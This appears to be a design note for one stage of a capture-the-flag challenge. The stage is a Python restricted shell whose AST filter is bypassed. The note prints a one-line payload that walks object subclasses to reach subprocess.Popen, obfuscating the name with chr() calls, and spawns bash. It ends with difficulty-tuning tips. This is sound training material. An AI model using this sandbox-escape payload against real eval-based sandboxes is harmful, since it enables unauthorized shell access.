# Stage 1: Restricted Shell (AST Filter Bypass)

## Concept
This module provides a custom diagnostic CLI (`sentinel-shell.py`) acting as the login shell for the initial entrypoint account (`operator` or `ctf`).
It exposes container diagnostics while strictly preventing unauthorized command execution through AST validation and isolated builtins.

## Vulnerability & Exploit
The `eval-rule` diagnostic command validates expressions using an AST whitelist. While direct names like `os`, `sys`, and `subprocess` are filtered, Python's class hierarchy is accessible via `().__class__.__base__.__subclasses__()`.
Because `subprocess` is imported within the shell process for system telemetry, `subprocess.Popen` is indexed among the subclasses of `object`.

### Payload:
```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == chr(80)+chr(111)+chr(112)+chr(101)+chr(110)][0](['/bin/bash']).wait()
```

## How to Customize / Extend
- **Difficulty Adjustments**:
  - *Make Easier*: Allow standard bash utilities or relax the AST node whitelist.
  - *Make Harder*: Strip loaded subclasses from memory, restrict `__class__` access, or replace with a C-based seccomp jail.
- **Alternative Shell Implementations**:
  - Replace `sentinel-shell.py` with standard `rbash` or a constrained sudo rule set.
